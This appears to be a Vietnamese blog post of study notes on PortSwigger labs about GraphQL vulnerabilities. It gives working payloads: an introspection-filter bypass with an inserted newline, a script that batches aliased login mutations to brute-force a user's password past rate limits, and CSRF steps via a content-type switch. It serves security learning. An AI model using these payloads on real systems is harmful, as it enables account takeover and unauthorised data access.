---
layout: post
title: "GraphQL API vulnerabilities"
render_with_liquid: false
categories:
  - Web Security
  - PortSwigger
tags:
  - portswigger
  - graphql-api-vulnerabilities
source_collection: notion_portswigger
---
Topics: Advanced

# Test 01: **Finding a hidden GraphQL endpoint**

Các endpoint phổ biến:

```jsx
/graphql
/api
/api/graphql
/graphql/api
/graphql/graphql
```

```jsx
dirb target
dirsearch -u targe
gobuster dir -u target -w wordlists/seclists/Discovery/Web-Content/graphql.txt
```

Sau khi tìm được endpoint chạy GraphQL, có thể nhận được phản hồi sau

![image.png](/assets/img/portswigger/graphql-api-vulnerabilities/image.png)

&gt; GraphQL services will often respond to any non-GraphQL request with a "query not present" or similar error. You should bear this in mind when testing for GraphQL endpoints.
&gt; 

Sử dụng **Universal queries** để xác nhận GraphQL đang chạy

```jsx
query{__typename}
/api?query=query{__typename}
```

![image.png](/assets/img/portswigger/graphql-api-vulnerabilities/image%201.png)

# Test 02: **Probing for introspection**

Kiểm tra xem introspection có đang enable hay không

```jsx
{
        "query": "{__schema{queryType{name}}}"
}
```

![image.png](/assets/img/portswigger/graphql-api-vulnerabilities/image%202.png)

→ Đang enable nhưng bị chặn

**⇒ Nếu bị chặn như ảnh trên thì chuyển sang Test Case 04**

# Test 03: Using **introspection**

**Discovering schema information**

**Running a full introspection query**

- **Payload JSon**
    
    ```jsx
    query IntrospectionQuery {
      __schema {
        queryType {
          name
        }
        mutationType {
          name
        }
        subscriptionType {
          name
        }
        types {
          ...FullType
        }
        directives {
          name
          description
          args {
            ...InputValue
          }
        }
      }
    }
    
    fragment FullType on __Type {
      kind
      name
      description
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }
    
    fragment InputValue on __InputValue {
      name
      description
      type {
        ...TypeRef
      }
      defaultValue
    }
    
    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
          }
        }
      }
    }
    ```
    
- **Payload in URL**
    
    ```jsx
    /api?query=query+IntrospectionQuery+%7B%0A++__schema+%7B%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
    ```
    

**Hoặc sử dụng công cụ tạo introspection của burpsuite**

Trong giao diện **GraphQL → Chuột phải → Set introspection query**

![{579BB982-240F-4320-A2D6-CFC8CD04F7BF}.png](/assets/img/portswigger/graphql-api-vulnerabilities/579BB982-240F-4320-A2D6-CFC8CD04F7BF.png)

# Test 04: Bypass **introspection defense**

**Discovering schema information**

  **“message": "GraphQL introspection is not allowed, but the query contained __schema or __type”**

![image.png](/assets/img/portswigger/graphql-api-vulnerabilities/image%203.png)

Trong phản hồi rằng **introspection** là không được phép.

Sửa đổi truy vấn để thêm 1 ký tự xuống dòng sau **__schema** và gửi lại.

- **Payload in URL**
    
    ```jsx
    /api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
    ```
    
- **Payload in JSon**
    
    ```jsx
    query IntrospectionQuery {
      __schema
     {
        queryType {
          name
        }
        mutationType {
          name
        }
        subscriptionType {
          name
        }
        types {
          ...FullType
        }
        directives {
          name
          description
          args {
            ...InputValue
          }
        }
      }
    }
    
    fragment FullType on __Type {
      kind
      name
      description
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }
    
    fragment InputValue on __InputValue {
      name
      description
      type {
        ...TypeRef
      }
      defaultValue
    }
    
    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
          }
        }
      }
    }
    
    ```
    

&gt; Nếu tính năng **introspection** được bật nhưng truy vấn trên không chạy, hãy thử xóa các chỉ thị **onOperation**, **onFragment** và **onField** khỏi cấu trúc truy vấn. Nhiều endpoint không chấp nhận các chỉ thị này như một phần của truy vấn **introspection**, và thường có thể thành công hơn với tính năng **introspection** bằng cách xóa chúng.
&gt; 

Thấy rằng phản hồi hiện bao gồm đầy đủ chi tiết nội quan. Điều này là do máy chủ được cấu hình để loại trừ các truy vấn khớp với regex "**__schema{**", mà truy vấn không còn khớp nữa mặc dù nó vẫn là một truy vấn introspection hợp lệ.

![image.png](/assets/img/portswigger/graphql-api-vulnerabilities/image%204.png)

Sau đó thêm **introspection** vào sitemap: Trong giao diện **GraphQL → Chuột phải → Save GraphQL queries to site map** để burpsuite tự phân tích cấu trúc document từ phản hồi của **introspection**

![image.png](/assets/img/portswigger/graphql-api-vulnerabilities/image%205.png)

- **Sử dụng query tìm được để lấy ra user có id=3**

![image.png](/assets/img/portswigger/graphql-api-vulnerabilities/image%206.png)

- **Sử dụng query tìm được để xóa user có id=3**

![image.png](/assets/img/portswigger/graphql-api-vulnerabilities/image%207.png)

# Test 05: **Bypassing rate limiting using aliases**

Đối tượng GraphQL không thể chứa nhiều thuộc tính có cùng tên. Ví dụ: truy vấn sau không hợp lệ vì nó cố gắng trả về loại sản phẩm hai lần.

```jsx
   #Invalid query

    query getProductDetails {
        getProduct(id: 1) {
            id
            name
        }
        getProduct(id: 2) {
            id
            name
        }
    }
```

Bí danh cho phép bạn bỏ qua hạn chế này bằng cách đặt tên rõ ràng các thuộc tính bạn muốn API trả về. Bạn có thể sử dụng bí danh để trả về nhiều phiên bản của cùng một loại đối tượng trong một yêu cầu. Điều này giúp giảm số lượng lệnh gọi API cần thiết.

```jsx

    #Valid query using aliases

    query getProductDetails {
        product1: getProduct(id: "1") {
            id
            name
        }
        product2: getProduct(id: "2") {
            id
            name
        }
    }
```

```jsx
 #Response to query

    {
        "data": {
            "product1": {
                "id": 1,
                "name": "Juice Extractor"
             },
            "product2": {
                "id": 2,
                "name": "Fruit Overlays"
            }
        }
    }

```

**Bypassing rate limiting using aliases**

1. **Tại yêu cầu đăng nhập**
    
    ![image.png](/assets/img/portswigger/graphql-api-vulnerabilities/image%208.png)
    
2. **Tạo danh sách aliases tương ứng với mutation trên**
    
    ```jsx
    copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
    bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
            token
            success
        }
    `.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
    ```
    
    - Danh sách các bí danh phải được chứa trong kiểu đột biến {}.
    - Mỗi đột biến có bí danh phải có tên người dùng là carlos và mật khẩu khác nhau từ danh sách xác thực.
    - Nếu muốn sửa đổi yêu cầu đã gửi đến Repeater, hãy xóa biến **dictionary** và trường **operationName** khỏi yêu cầu trước khi gửi. Bạn có thể thực hiện việc này từ tab **Pretty** của Repeater.
    
    ![{F3C6047B-5C56-4B98-962B-702F75099BB5}.png](/assets/img/portswigger/graphql-api-vulnerabilities/F3C6047B-5C56-4B98-962B-702F75099BB5.png)
    
3. **Copy vào GraphQL và ấn Send**
    
    ![image.png](/assets/img/portswigger/graphql-api-vulnerabilities/image%209.png)
    
4. **Kết quả**
    
    ![image.png](/assets/img/portswigger/graphql-api-vulnerabilities/image%2010.png)
    

# Test 06: **GraphQL CSRF**

Lỗ hổng giả mạo yêu cầu liên trang (CSRF) cho phép kẻ tấn công dụ dỗ người dùng thực hiện các hành động mà họ không có ý định thực hiện. Điều này được thực hiện bằng cách tạo một trang web độc hại giả mạo yêu cầu liên miền đến ứng dụng dễ bị tấn công.

GraphQL có thể được sử dụng như một phương tiện tấn công CSRF, trong đó kẻ tấn công tạo ra một lỗ hổng khiến trình duyệt của nạn nhân gửi truy vấn độc hại với tư cách là người dùng nạn nhân.

**How do CSRF over GraphQL vulnerabilities arise?**

Lỗ hổng CSRF có thể phát sinh khi điểm cuối GraphQL không xác thực **content type** của các yêu cầu được gửi đến và không triển khai mã CSRF.

Các yêu cầu POST sử dụng loại application/json sẽ an toàn trước nguy cơ giả mạo miễn là loại **content type** đó được xác thực. Trong trường hợp này, kẻ tấn công sẽ không thể khiến trình duyệt của nạn nhân gửi yêu cầu này ngay cả khi nạn nhân truy cập vào một trang web độc hại.

Tuy nhiên, các phương thức thay thế như **GET**, hoặc bất kỳ yêu cầu nào có kiểu nội dung là **x-www-form-urlencoded**, có thể được gửi qua trình duyệt và do đó có thể khiến người dùng dễ bị tấn công nếu điểm cuối chấp nhận các yêu cầu này. Trong trường hợp này, kẻ tấn công có thể tạo ra các lỗ hổng để gửi các yêu cầu độc hại đến API.

1. **Trong truy vấn thay đổi email sau**
    
    ![image.png](/assets/img/portswigger/graphql-api-vulnerabilities/image%2011.png)
    
2. **Thay đổi Content-Type: application/json thành Content-Type: application/x-www-form-urlencoded**
3. **Encoded URL từng giá trị của query, operationName, variables có trong body json**
    
    Thay thế chuỗi `\n` bằng cách `enter` xuống dòng
    
    ![{ADC5EE31-CEE2-47FC-96F9-242FF5A93A2D}.png](/assets/img/portswigger/graphql-api-vulnerabilities/ADC5EE31-CEE2-47FC-96F9-242FF5A93A2D.png)
    
    ![{B9DEDE68-4748-4B91-8458-7981DBB0B151}.png](/assets/img/portswigger/graphql-api-vulnerabilities/B9DEDE68-4748-4B91-8458-7981DBB0B151.png)
    
    ![image.png](/assets/img/portswigger/graphql-api-vulnerabilities/image%2012.png)
    
4. **Tạo CSRF PoC rồi gửi cho victim**
    
    (lab trong portswigger cần thay đổi email trc khi PoC CSRF)
    
    ![{A42F99AF-06A6-45D4-BD91-49B1D6DEA20D}.png](/assets/img/portswigger/graphql-api-vulnerabilities/A42F99AF-06A6-45D4-BD91-49B1D6DEA20D.png)
